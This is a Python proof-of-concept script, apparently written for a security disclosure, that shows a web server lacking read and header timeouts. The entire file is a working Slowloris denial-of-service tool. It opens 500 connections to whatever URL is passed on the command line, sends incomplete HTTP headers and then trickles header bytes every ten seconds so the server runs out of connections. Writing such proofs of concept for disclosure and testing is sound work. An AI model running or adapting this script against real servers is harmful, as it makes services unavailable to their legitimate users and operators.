#!/usr/bin/env python3
"""
PoC: Slowloris-style DoS — Missing Server Timeouts

Demonstrates that the HTTP server has no ReadTimeout, WriteTimeout, or
ReadHeaderTimeout, allowing connections to be held open indefinitely.

Usage:
    python3 poc_slowloris.py http://localhost:8080

Impact: Each connection is held open indefinitely. After enough connections,
the server cannot accept new ones, causing a complete denial of service.
"""

import sys
import socket
import time
from urllib.parse import urlparse

NUM_CONNECTIONS = 500
SEND_INTERVAL = 10  # seconds between keep-alive bytes

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} http://localhost:8080")
        sys.exit(1)

    url = urlparse(sys.argv[1])
    host = url.hostname or "localhost"
    port = url.port or 80

    print(f"[*] Target: {host}:{port}")
    print(f"[*] Opening {NUM_CONNECTIONS} slow connections")
    print(f"[*] Each sends 1 header byte every {SEND_INTERVAL}s to stay alive")
    print(f"[*] Monitor connections: ss -tn | grep :{port} | wc -l")
    print(f"[*] Test availability: curl -m5 http://{host}:{port}/")
    print()

    sockets = []

    # Phase 1: Open connections with partial HTTP headers
    for i in range(NUM_CONNECTIONS):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            # Send a partial HTTP request — just the first line, no \r\n\r\n
            sock.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
            sockets.append(sock)
            if (i + 1) % 50 == 0:
                print(f"[*] Opened {i + 1}/{NUM_CONNECTIONS} connections")
        except Exception as e:
            print(f"[!] Failed to open connection {i + 1}: {e}")
            print(f"[!] Server may have run out of file descriptors — DoS achieved with {len(sockets)} connections")
            break

    print(f"\n[*] {len(sockets)} connections open. Server should now be unresponsive.")
    print(f"[*] Verify: curl -m5 http://{host}:{port}/")
    print(f"[*] Keeping connections alive (Ctrl+C to stop)...\n")

    # Phase 2: Keep connections alive by slowly sending headers
    try:
        cycle = 0
        while True:
            time.sleep(SEND_INTERVAL)
            cycle += 1
            alive = 0
            for sock in sockets:
                try:
                    # Send a partial header to keep the connection open
                    sock.sendall(f"X-Keep-Alive-{cycle}: {cycle}\r\n".encode())
                    alive += 1
                except Exception:
                    pass
            print(f"[*] Cycle {cycle}: {alive}/{len(sockets)} connections still alive")
            if alive == 0:
                print("[!] All connections dropped — server may have been restarted")
                break
    except KeyboardInterrupt:
        print(f"\n[*] Stopping — closing {len(sockets)} connections")
        for sock in sockets:
            try:
                sock.close()
            except Exception:
                pass

if __name__ == "__main__":
    main()
